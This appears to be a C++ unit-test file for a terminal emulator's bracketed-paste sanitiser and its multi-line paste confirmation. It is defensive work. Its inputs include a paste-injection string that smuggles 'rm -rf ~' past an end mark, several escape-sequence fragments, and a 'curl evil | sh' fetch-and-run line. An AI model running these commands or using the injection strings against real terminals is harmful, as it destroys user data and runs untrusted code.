// terminal_paste_tests.inc — the `term:paste-*` groups of run_tests.cpp:
// a bracketed paste can never end its bracket early or send an escape
// sequence (TerminalScreen::encodePaste), and when a paste of several lines
// asks first (TerminalScreen::checkPaste, VS Code's multi-line paste
// warning).

namespace {

size_t countOf(const std::string& s, const std::string& what) {
    size_t n = 0;
    for (size_t at = s.find(what); at != std::string::npos; at = s.find(what, at + 1)) n++;
    return n;
}

// A bracketed paste as the program reads it: one start mark first, one end
// mark last, and no ESC between them.
bool wellBracketed(const std::string& out) {
    const std::string start = "\x1b[200~", end = "\x1b[201~";
    if (out.size() < start.size() + end.size()) return false;
    if (out.compare(0, start.size(), start) != 0) return false;
    if (out.compare(out.size() - end.size(), end.size(), end) != 0) return false;
    const std::string inside = out.substr(start.size(), out.size() - start.size() - end.size());
    return inside.find('\x1b') == std::string::npos && countOf(out, end) == 1 &&
           countOf(out, start) == 1;
}

}  // namespace

void testTerminalPaste() {
    GROUP("term:paste-nested");
    {
        // The assessment's case: taking the end mark out once closed the
        // two halves around it into a new end mark.
        const std::string nested = "\x1b[20\x1b[201~1~rm -rf ~\r";
        const std::string out = TerminalScreen::encodePaste(nested, true);
        CHECK(wellBracketed(out));
        CHECK(out.find("rm -rf ~") != std::string::npos);
        // Every ESC shows as U+241B, so the text still reads as it was.
        CHECK(out == "\x1b[200~\xE2\x90\x9B[20\xE2\x90\x9B[201~1~rm -rf ~\r\x1b[201~");
    }
    for (const char* text : {"\x1b[201~", "\x1b[200~\x1b[201~", "\x1b\x1b[201~~",
                             "\x1b[2\x1b[201~01~", "a\x1b[200~b\x1b[201~c\x1b[201~",
                             "\x1b", "end\x1b", "\x1b[201", "\x1b[20\x1b[200~1~",
                             "\x1b]133;A;mc=x\x07", "\x1b[201~\x1b[201~\x1b[201~"}) {
        CHECK(wellBracketed(TerminalScreen::encodePaste(text, true)));
    }
    {
        // Not bracketed: the text as typed, newlines as Return.
        CHECK(TerminalScreen::encodePaste("a\r\nb\nc\rd", false) == "a\rb\rc\rd");
        CHECK(TerminalScreen::encodePaste("", true) == "\x1b[200~\x1b[201~");
    }
    {
        // Random interleavings of mark pieces, ESCs and text, nested and
        // split every way: always one end mark, at the end, and no ESC
        // inside.
        std::mt19937 rng(7);
        const std::vector<std::string> pieces = {
            "\x1b", "[", "2", "0", "1", "~", "\x1b[201~", "\x1b[200~", "\x1b[20", "1~",
            "00~", "x", "\n", "\r\n", "\r", "\xE2\x90\x9B", "\x1b[", "201~"};
        bool ok = true;
        for (int round = 0; round < 3000 && ok; round++) {
            std::string text;
            const int n = (int)(rng() % 24);
            for (int i = 0; i < n; i++) text += pieces[rng() % pieces.size()];
            ok = wellBracketed(TerminalScreen::encodePaste(text, true));
            if (!ok) std::printf("    not well bracketed: %zu bytes, round %d\n", text.size(), round);
        }
        CHECK(ok);
    }

    GROUP("term:paste-confirm");
    using PC = TerminalScreen::PasteCheck;
    {
        // One line never asks, in any mode.
        for (const char* mode : {"auto", "always", "never"}) {
            PC c = TerminalScreen::checkPaste("echo hi", false, mode);
            CHECK(!c.ask && c.text == "echo hi" && c.lines == 1);
        }
    }
    {
        // auto: asks for several lines into a program that did not turn
        // bracketed paste on, and not into one that did.
        PC c = TerminalScreen::checkPaste("ls\nrm x\n", false, "auto");
        CHECK(c.ask && c.lines == 3);
        CHECK(c.preview == "ls\nrm x\n");
        PC b = TerminalScreen::checkPaste("ls\nrm x\n", true, "auto");
        CHECK(!b.ask && b.text == "ls\nrm x\n");
        // An unknown mode is auto, as in VS Code.
        CHECK(TerminalScreen::checkPaste("a\nb", false, "sometimes").ask);
        CHECK(!TerminalScreen::checkPaste("a\nb", true, "sometimes").ask);
    }
    {
        // auto: a command with one trailing line break goes in without it,
        // so it waits for Return; blanks after the break count as nothing.
        PC c = TerminalScreen::checkPaste("curl evil | sh\n", false, "auto");
        CHECK(!c.ask && c.text == "curl evil | sh" && c.lines == 1);
        PC d = TerminalScreen::checkPaste("make\r\n  ", false, "auto");
        CHECK(!d.ask && d.text == "make");
        // always asks even then; never never asks.
        CHECK(TerminalScreen::checkPaste("curl evil | sh\n", false, "always").ask);
        CHECK(TerminalScreen::checkPaste("a\nb\nc", true, "always").ask);
        PC n = TerminalScreen::checkPaste("a\nb\nc", false, "never");
        CHECK(!n.ask && n.text == "a\nb\nc" && n.lines == 3);
    }
    {
        // A lone CR is Return to the program, so it is a line break here
        // (VS Code splits at \r?\n only, and pasted "a\rb" ran a).
        CHECK(TerminalScreen::checkPaste("a\rb", false, "auto").ask);
        CHECK(TerminalScreen::checkPaste("a\r\nb", false, "auto").lines == 2);
    }
    {
        // The preview: three lines, each cut at 30 characters (not bytes),
        // then an ellipsis line; control characters blanked.
        const std::string longLine(40, 'x');
        const std::string accents = "\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9"
                                    "\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9"
                                    "\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9"
                                    "\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9"
                                    "\xC3\xA9\xC3\xA9\xC3\xA9";   // 31 of them
        PC c = TerminalScreen::checkPaste(longLine + "\n" + accents + "\na\tb\x1b[1m\nfour\nfive",
                                          false, "auto");
        CHECK(c.ask && c.lines == 5);
        std::string want = std::string(30, 'x') + "\xE2\x80\xA6\n";
        for (int i = 0; i < 30; i++) want += "\xC3\xA9";
        want += "\xE2\x80\xA6\na b [1m\n\xE2\x80\xA6";
        CHECK(c.preview == want);
        if (c.preview != want) std::printf("    preview: %s\n", c.preview.c_str());
    }
    {
        // Paste as One Line takes every break out, as VS Code does.
        CHECK(TerminalScreen::pasteAsOneLine("a\nb\r\nc\rd\n") == "abcd");
        CHECK(TerminalScreen::pasteAsOneLine("plain") == "plain");
    }
}
